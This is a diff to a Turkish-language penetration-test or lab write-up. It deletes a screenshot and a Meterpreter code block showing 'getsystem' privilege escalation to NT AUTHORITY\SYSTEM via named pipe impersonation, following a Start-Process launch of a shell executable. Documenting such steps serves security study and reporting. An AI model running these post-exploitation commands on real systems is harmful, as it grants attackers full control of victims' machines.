@@ -191,18 +191,7 @@ Start-Process "shell-name.exe"
 
 Bu işlemle birlikte Metasploit handler tarafında bir Meterpreter oturumu açıldı:
 
-<img width="1158" height="678" alt="shellalma" src="https://github.com/user-attachments/assets/a8a57775-7b18-48c6-b946-d0c9b5a76e58" />
-
 <img width="907" height="173" alt="shell2" src="https://github.com/user-attachments/assets/8e80945e-b7a1-4783-9958-43f33e634953" />
-
-
-```
-meterpreter > getsystem
-[*] ...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
-
-meterpreter > getuid
-Server username: NT AUTHORITY\SYSTEM
-```
 
 ### 5.4 Process Migration ile Token Sorununun Çözülmesi
 
